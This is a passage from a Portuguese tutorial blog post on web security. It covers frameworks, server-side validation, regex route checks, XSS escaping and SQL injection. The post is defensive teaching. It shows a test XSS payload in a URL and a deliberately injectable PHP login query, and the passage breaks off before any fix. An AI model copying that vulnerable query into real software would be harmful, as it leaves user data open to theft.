“pensar” como um usuário mal-intencionado. Não somente para garantir o
bom funcionamento da mesma, mas também para garantir a segurança e
bem-estar dos “usuários civis” que consomem os nossos serviços.&lt;/p&gt;
&lt;p&gt;Vamos explorar alguns problemas relacionados a segurança, e mostrar como
solucioná-los de forma simples e prática.&lt;/p&gt;
&lt;h2&gt;Use frameworks!&lt;/h2&gt;
&lt;p&gt;E esta é a minha primeira dica para você: use &lt;em&gt;frameworks&lt;/em&gt; sempre que
possível!&lt;/p&gt;
&lt;p&gt;Eles já possuem um conjunto de ferramentas que contornam problemas como
&lt;em&gt;SQL Injection&lt;/em&gt;, &lt;em&gt;XSS&lt;/em&gt; e &lt;em&gt;CSRF&lt;/em&gt;. Pessoas muito inteligentes já pensaram no
problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!&lt;/p&gt;
&lt;p&gt;Em alguns &lt;em&gt;frameworks&lt;/em&gt;, como o &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;/tag/codeigniter.html&quot; title=&quot;Leia mais sobre Codeigniter&quot;&gt;&lt;em&gt;Codeigniter&lt;/em&gt;&lt;/a&gt;, essas
ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
nenhum) trabalho para utilizá-las no cotidiano.&lt;/p&gt;
&lt;p&gt;Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
posso apontar vários pontos de falhas em aplicações que produzi no
passado. Os &lt;em&gt;frameworks&lt;/em&gt; diminuem muito estes pontos, por isso vale a
pena o seu uso.&lt;/p&gt;
&lt;h2&gt;Validações (nunca confie no usuário)&lt;/h2&gt;
&lt;p&gt;Como eu comecei com o &lt;a href=&quot;/tag/php.html&quot; title=&quot;Leia mais sobre PHP&quot;&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, sei muito bem que este é um problema
comum em aplicações desenvolvidas por iniciantes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nunca confie no usuário&lt;/strong&gt;, e principalmente &lt;strong&gt;nunca confie em
validações realizadas pelo &lt;a href=&quot;/tag/javascript.html&quot; title=&quot;Leia mais sobre Javascript&quot;&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;&lt;/strong&gt;. Todo ponto de entrada de
informação deve possuir uma validação no &lt;em&gt;server-side&lt;/em&gt;, mesmo que exista
uma validação no &lt;em&gt;client-side&lt;/em&gt;. &lt;strong&gt;Lembre-se:&lt;/strong&gt; Existem navegadores que
não utilizam &lt;em&gt;Javascript&lt;/em&gt;, e mesmo os que utilizam, permitem que o
usuário desabilite esta função.&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Django&lt;/em&gt;, podemos fazer validações de formulários através de
&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/forms/&quot; title=&quot;Conheça os Forms no Django&quot;&gt;&lt;em&gt;Forms&lt;/em&gt;&lt;/a&gt;. No &lt;em&gt;Codeigniter&lt;/em&gt; fazemos através da &lt;a href=&quot;http://codeigniter.com/user_guide/libraries/form_validation.html&quot; title=&quot;Veja como fazer validações de formulário no Codeigniter&quot;&gt;&lt;em&gt;Form Validation Class&lt;/em&gt;&lt;/a&gt;.
Em &lt;em&gt;PHP&lt;/em&gt; “puro”, podemos fazer validações através da &lt;a href=&quot;http://pear.php.net/manual/en/package.validate.validate.intro.php&quot; title=&quot;Instale a Validate através da PEAR&quot;&gt;biblioteca &lt;em&gt;Validate&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As ferramentas citadas acima são extremamente eficientes para ações
realizadas via &lt;em&gt;POST&lt;/em&gt;. Mas e quando temos parâmetros vindos da &lt;em&gt;URL&lt;/em&gt;,
através do método &lt;em&gt;GET&lt;/em&gt;, qual é a melhor maneira de agirmos?&lt;/p&gt;
&lt;h3&gt;URLs seguras e amigáveis&lt;/h3&gt;
&lt;p&gt;Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
nas aplicações &lt;em&gt;web&lt;/em&gt; e tornaram-se item obrigatório. Além de trazer o
benefício do &lt;a href=&quot;http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca&quot; title=&quot;Leia mais sobre SEO no Wikipedia&quot;&gt;&lt;em&gt;SEO&lt;/em&gt;&lt;/a&gt;, elas podem ser uma grande aliada quando o
assunto é segurança.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;URLs&lt;/em&gt; que antes eram feitas dessa maneira:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;/blog.php?year=2012&amp;amp;month=12&amp;amp;day=21&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Podem ser reproduzidas desta forma:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;/blog/2012/12/21/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O mecanismo de rotas de alguns &lt;em&gt;frameworks&lt;/em&gt; permite a utilização de
expressões regulares na construção do caminho. Por exemplo, em &lt;em&gt;Django&lt;/em&gt;
temos o seguinte cenário:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# urls.py&lt;/span&gt;

urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; patterns&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;^blog/(?P&amp;lt;year&gt;\d{4})/(?P&amp;lt;month&gt;[0-9]{2})/(?P&amp;lt;day&gt;\d{2})/$&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;blog.views.index&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Determinamos que a rota inicia-se por &lt;code class=&quot;language-text&quot;&gt;blog&lt;/code&gt;, sendo composta por um
valor numérico de 4 dígitos que atende pelo identificador &lt;code class=&quot;language-text&quot;&gt;year&lt;/code&gt;,
outro valor de dois dígitos, indo de 0 a 9, chamado &lt;code class=&quot;language-text&quot;&gt;month&lt;/code&gt;, e o
último um valor numérico de 2 dígitos chamado &lt;code class=&quot;language-text&quot;&gt;day&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A verificação é feita no momento da requisição. Se a rota informada
bater com o padrão criado, ele executa a &lt;em&gt;view&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;blog.views&lt;/code&gt;. Caso
contrário, se a rota não bater com nenhum padrão informado (por exemplo,
&lt;code class=&quot;language-text&quot;&gt;/blog/2012/aa/21/&lt;/code&gt;), o usuário tomará um erro 404.&lt;/p&gt;
&lt;p&gt;Em nossa &lt;em&gt;view&lt;/em&gt;, resgataríamos esses valores da seguinte forma:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# blog/views.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; year&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; month&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; day&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;# Lógica de renderização...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Simples assim! Temos um “input” de informação através de &lt;em&gt;GET&lt;/em&gt;, onde
temos certeza do seu tipo e tamanho.&lt;/p&gt;
&lt;p&gt;O mesmo resultado pode ser obtido com o &lt;em&gt;Codeigniter&lt;/em&gt;, basta adicionar a
expressão desejada em seu &lt;code class=&quot;language-text&quot;&gt;application/config/routes.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token shell-comment comment&quot;&gt;# application/config/routes.php&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;blog/(\d{4})/([0-9]{2})/(\d{2})&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;blog/index/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$1&lt;/span&gt;&lt;/span&gt;/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$2&lt;/span&gt;&lt;/span&gt;/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$3&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
criados na expressão regular.&lt;/p&gt;
&lt;p&gt;Você não precisa utilizar um &lt;em&gt;framework&lt;/em&gt; para ter um esquema de rotas
como ilustrado acima. Um resultado parecido pode ser atingido através do
&lt;a href=&quot;/tag/nginx.html&quot; title=&quot;Leia mais sobre Nginx&quot;&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; e do &lt;em&gt;Apache&lt;/em&gt; com &lt;em&gt;mod-rewrite&lt;/em&gt;. &lt;a href=&quot;http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php&quot; title=&quot;Como criar rotas para arquivos PHP com o Apache&quot;&gt;Veja um exemplo de uso&lt;/a&gt;
apresentado numa &lt;em&gt;thread&lt;/em&gt; do &lt;em&gt;Stack Overflow&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É claro que verificações mais complexas, como por exemplo, se o nome do
usuário informado na &lt;em&gt;URL&lt;/em&gt; é válido, necessitam de regras específicas,
muito provavelmente escritas dentro da &lt;em&gt;view&lt;/em&gt;. Um ponto de falha que
vale ressaltar é a criação de expressões regulares “genéricas”, que não
discriminam o tipo e tamanho dos valores informados.&lt;/p&gt;
&lt;h3&gt;Verificação de tipos de dados&lt;/h3&gt;
&lt;p&gt;Mas e quando não temos como fugir de um valor passado via &lt;em&gt;GET&lt;/em&gt;? Pode
acontecer! Por exemplo, em paginações (onde normalmente passamos um
valor &lt;code class=&quot;language-text&quot;&gt;page&lt;/code&gt; como parâmetro), ou em uma busca (onde passamos o valor
pesquisado via &lt;em&gt;GET&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
de interpretação do nosso código:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;/^\d+$/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A solução acima não é infalível, mas é uma maneira de diminuírmos a
incidência de erros. Se um valor diferente de inteiro positivo for
passado, a página a ser exibida será a primeira.&lt;/p&gt;
&lt;h2&gt;XSS – Cross-Site Scripting (não confie na informação)&lt;/h2&gt;
&lt;p&gt;É certo que, validando toda e qualquer
informação que a sua aplicação receber, você diminuirá muito a
ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
informação, não podemos confiar no seu conteúdo.&lt;/p&gt;
&lt;p&gt;Imagine que você possua um &lt;em&gt;blog&lt;/em&gt;. Só você pode escrever artigos nele,
então você conhece o conteúdo da informação sendo produzida. Certo dia
você resolve que os usuários poderão comentar no seu &lt;em&gt;blog&lt;/em&gt;, e
desenvolve uma ferramenta de comentários com todas as validações citadas
anteriormente.&lt;/p&gt;
&lt;p&gt;Até que em certo momento, um usuário mal-intencionado &lt;strong&gt;escreve um
comentário&lt;/strong&gt; no seu &lt;em&gt;post&lt;/em&gt;, e neste comentário existe um &lt;strong&gt;&lt;em&gt;script&lt;/em&gt;&lt;/strong&gt;
&lt;em&gt;Javascript&lt;/em&gt; que explora uma &lt;strong&gt;falha de segurança&lt;/strong&gt; do &lt;em&gt;ActiveX&lt;/em&gt; (por
exemplo). Logo, todos os leitores que utilizam &lt;em&gt;Internet Explorer&lt;/em&gt; e
leram o seu &lt;em&gt;post&lt;/em&gt; são infectados por um &lt;em&gt;malware&lt;/em&gt; que o seu &lt;em&gt;blog&lt;/em&gt;
ajudou a proliferar.&lt;/p&gt;
&lt;p&gt;A injeção de um &lt;em&gt;script&lt;/em&gt; em um &lt;em&gt;website&lt;/em&gt;, através de campos de textos ou
passagem de parâmetros, é caracterizado como um ataque de &lt;strong&gt;&lt;em&gt;Cross-Site
Scripting&lt;/em&gt;&lt;/strong&gt; (ou &lt;em&gt;XSS&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Uma maneira muito comum de evitar esse tipo de problema é simplesmente
“escapando” ou removendo elementos &lt;em&gt;HTML&lt;/em&gt; do conteúdo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;token shell-comment comment&quot;&gt;# xss.php&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$var&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;var&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Acessar &lt;code class=&quot;language-text&quot;&gt;xss.php&lt;/code&gt; com um &lt;code class=&quot;language-text&quot;&gt;alert&lt;/code&gt; &lt;em&gt;Javascript&lt;/em&gt; como parâmetro, não
executará o comando, e sim apenas exibirá o conteúdo na tela, com os
caracteres que delimitam o elemento &lt;code class=&quot;language-text&quot;&gt;script&lt;/code&gt; devidamente formatados:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://localhost/xss.php?var=&amp;amp;lt;script&amp;amp;gt;alert(&amp;quot;XSS!&amp;quot;);&amp;amp;lt;/script&amp;amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Existem alguns &lt;a href=&quot;http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/&quot; title=&quot;Conheça 20 excelentes editores WYSIWYG&quot;&gt;&lt;em&gt;Rich Text Editors&lt;/em&gt;&lt;/a&gt; que verificam e formatam o
conteúdo do campo antes de uma submissão. Mas &lt;strong&gt;lembre-se&lt;/strong&gt;! Editores
&lt;em&gt;WYSIWYG&lt;/em&gt; são basicamente &lt;em&gt;Javascript&lt;/em&gt;, logo, se eu desabilitar o
&lt;em&gt;Javascript&lt;/em&gt; do meu navegador, posso enviar &lt;em&gt;scripts&lt;/em&gt; maliciosos sem
impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
validação no &lt;em&gt;server-side&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code class=&quot;language-text&quot;&gt;$config[&amp;#39;global_xss_filtering’]&lt;/code&gt; como
&lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt;, filtra automaticamente os dados resgatados de &lt;em&gt;GET&lt;/em&gt; ou &lt;em&gt;POST&lt;/em&gt;.
O que acho bacana desse filtro, é que ele previne apenas a injeção de
&lt;em&gt;scripts&lt;/em&gt; e atributos que podem de alguma forma prejudicar na segurança
da sua aplicação, não necessariamente formatando o conteúdo todo.&lt;/p&gt;
&lt;p&gt;Este tratamento está ativo por padrão no &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt; do
&lt;em&gt;Django&lt;/em&gt;. Embora isso não impeça o armazenamento do &lt;em&gt;script&lt;/em&gt; no banco de
dados, impede que a sua renderização afete os usuários da sua aplicação.&lt;/p&gt;
&lt;p&gt;Uma outra forma muito bacana de prevenir este tipo de inconveniente é
utilizando uma linguagem de marcação alternativa, como &lt;em&gt;Textile&lt;/em&gt; e
&lt;em&gt;Markdown&lt;/em&gt;, em campos de textos abertos.&lt;/p&gt;
&lt;h2&gt;SQL Injection (não confie em sua aplicação)&lt;/h2&gt;
&lt;p&gt;Entre as vulnerabilidades citadas, acredito que o
&lt;strong&gt;&lt;em&gt;SQL Injection&lt;/em&gt;&lt;/strong&gt; é uma das mais
destrutivas, tanto para a sua aplicação, quanto para os seus usuários.&lt;/p&gt;
&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;É um tipo de ameaça de segurança que se aproveita de falhas em
sistemas que interagem com bases de dados via SQL. A injeção de
SQL ocorre quando o atacante consegue inserir
uma série de instruções SQL dentro de uma
consulta (query) através da manipulação das entrada de dados de uma
aplicação.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
de usuários não autorizados a áreas restritas, e o roubo de informações
da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
de usuário e senha:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;token shell-comment comment&quot;&gt;# sql-injection.php&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Abre conexão com o banco de dados&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$link&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Seleciona a base de dados&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;exemplos_blog&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;SELECT 1 FROM usuario WHERE usuario = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&apos; &quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;AND senha = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Query inválida: &quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;mysql_close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

